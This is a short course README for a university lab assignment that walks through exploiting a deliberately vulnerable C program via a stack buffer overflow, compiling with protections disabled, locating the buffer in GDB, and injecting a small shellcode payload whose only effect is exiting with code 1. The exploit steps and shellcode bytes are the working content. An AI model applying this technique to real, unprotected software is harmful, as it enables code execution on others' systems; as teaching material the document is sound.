# cmsc-134-mp1
Machine Problem 1: Buffer overflow to exit

## Steps
- Compile vuln.c using this command:
`gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln`

- Open GDB:
`gdb vuln`

- Inside GDB put a breakpoint:
`break 1`OR `break vuln.c:5`

- Print the buffer's memory address:
`print &buffer`

- Show registers:
`info registers`

- Show frame:
`info frame`

- Compile the asm file:
`gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm`

- Obtain machine code:
`objdump -d asm > asmdump`

- Save the shellcode:
`echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x58\xcb\xff\xff" > egg`

- Open GDB again
`run < egg`

## Result
You must have this message in your terminal

> [Inferior 1 (process 39346) exited with code 01]